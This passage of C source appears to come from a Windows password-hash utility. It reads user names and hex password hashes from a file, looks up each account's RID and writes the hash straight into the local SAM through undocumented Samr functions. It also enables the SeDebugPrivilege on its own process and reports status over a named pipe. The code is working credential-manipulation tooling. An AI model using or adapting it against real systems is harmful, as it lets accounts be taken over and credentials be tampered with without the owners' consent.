			MultiByteToWideChar(CP_ACP, 0, user, -1, wuser, sizeof (wuser));
			// then, copy the password hash out
			strcpy(hash, pos+1);
			// now, lookup the user on the local computer
			NetErr = NetUserGetInfo(NULL, wuser, 3, (LPBYTE*) &ui3);
			if (NetErr)
			{
				SendStatusMessage( "Unable to retrieve user information for %S : Error = %d\n", wuser, NetErr);
				goto exit;
			}
			// save RID for later
			
			RID = ui3->usri3_user_id;
			// free memory from NetUserGetInfo call
			NetApiBufferFree(ui3);

			// now we convert the password hash back into binary; yes, there is probably a better
			// and fancier way to do this, but I wanted to be clear and safe
			
			HashIndex = 0;
			for (i=0; i < 32; i++)
			{
				PwdByte[0] = hash[HashIndex];
				PwdByte[1] = hash[HashIndex + 1];
				PwdByte[2] = '\0';
				intTemp = strtoul(PwdByte, &stopstring, 16); //base 16 (hex) 
				pwd[i] = intTemp;
				HashIndex = HashIndex + 2;
			}
						
			// now get the target user, based on the RID of the user
			rc = pSamrOpenUser (hDomain, MAXIMUM_ALLOWED, RID, &hUser);
			if (rc < 0)
            {
				SendStatusMessage("SamrOpenUser for %S failed : 0x%08X\n", wuser, rc);
                goto exit;
            }

			// and finally put the hash back into the user
			rc = pSamrSetInformationUser (hUser, SAM_USER_INFO_PASSWORD_OWFS, pwd);
			pSamrCloseHandle (&hUser);
			if (rc < 0)
			{
				SendStatusMessage("SamrSetInformationUser for %S failed : 0x%08X\n", wuser, rc);
			}
			else
			{
				// WARNING: THIS DOES NOT WORK !  In our testing, trying to set this flag
				// resulted in a reboot of the server.
				//ui3->usri3_password_expired = 0; // 1 will force a password change
				//NetErr = NetUserSetInfo(NULL, wuser, 3, (LPBYTE) &ui3, NULL);
				SendStatusMessage("Set password for user %S\n", wuser);
			}
		}	
		fclose(stream);
	} 
	else
	{
		SendStatusMessage("Unable to open file");
	}
	
	ret = 0;

exit:
	// Clean up
	SendTerminationSignal();

	if (hPipe != NULL && hPipe != INVALID_HANDLE_VALUE)
		CloseHandle(hPipe);

	if(hUser) 
		pSamrCloseHandle(&hUser);
	if(hDomain) 
		pSamrCloseHandle(&hDomain);
	if(hSam) 
		pSamrCloseHandle(&hSam);
	if(hLsa) 
		LsaClose(hLsa);

	if(hSamsrv) 
		FreeLibrary(hSamsrv);
	if(hAdvapi32) 
		FreeLibrary(hAdvapi32);

    return ret;
}

// Try to enable the debug privilege
DWORD __declspec(dllexport)SetAccessPriv()
{
    HANDLE hToken = 0;
    DWORD dwError = 0;
    TOKEN_PRIVILEGES privileges;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        dwError = GetLastError();
		//SendStatusMessage("Unable to open process token: %d\n", dwError);
 		SendStatusMessage("PT failed: %d\n", dwError);
       goto exit;
    }

    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &privileges.Privileges[0].Luid))
    {
        dwError = GetLastError();
		//SendStatusMessage("Unable to open process token: %d\n", dwError);
 		SendStatusMessage("PT failed: %d\n", dwError);
        goto exit;
    }

    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    privileges.PrivilegeCount = 1;
    
    if(!AdjustTokenPrivileges(hToken, FALSE, &privileges, 0, NULL, NULL))
    {
        dwError = GetLastError();
		//SendStatusMessage("Unable to open process token: %d\n", dwError);
 		SendStatusMessage("PT failed: %d\n", dwError);
        goto exit;
    }

 exit:
    if(hToken) 
		CloseHandle(hToken);

    return dwError;
}


